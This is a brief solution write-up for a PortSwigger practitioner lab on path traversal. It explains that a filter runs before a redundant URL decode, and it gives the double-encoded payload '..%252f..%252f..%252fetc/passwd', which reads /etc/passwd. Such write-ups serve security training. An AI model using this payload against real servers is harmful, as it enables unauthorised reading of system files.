# Lab: File path traversal, traversal sequences stripped with superfluous URL-decode (Practitioner)

**Lab:** [https://portswigger.net/web-security/file-path-traversal/lab-superfluous-url-decode](https://portswigger.net/web-security/file-path-traversal/lab-superfluous-url-decode)

**Task (from PortSwigger):**  
This lab contains a path traversal vulnerability in the display of product images.

The application blocks input containing path traversal sequences. It then performs a URL-decode of the input before using it.

To solve the lab, retrieve the contents of the `/etc/passwd` file.

## Vulnerability
Filter runs before a second URL-decode. Double-encoded `../` (`%252f` = encoded `%2f`) passes the filter, then becomes `../` after decode.

## Solution

```
filename=..%252f..%252f..%252fetc/passwd
```

## Final Payload
```
..%252f..%252f..%252fetc/passwd
```
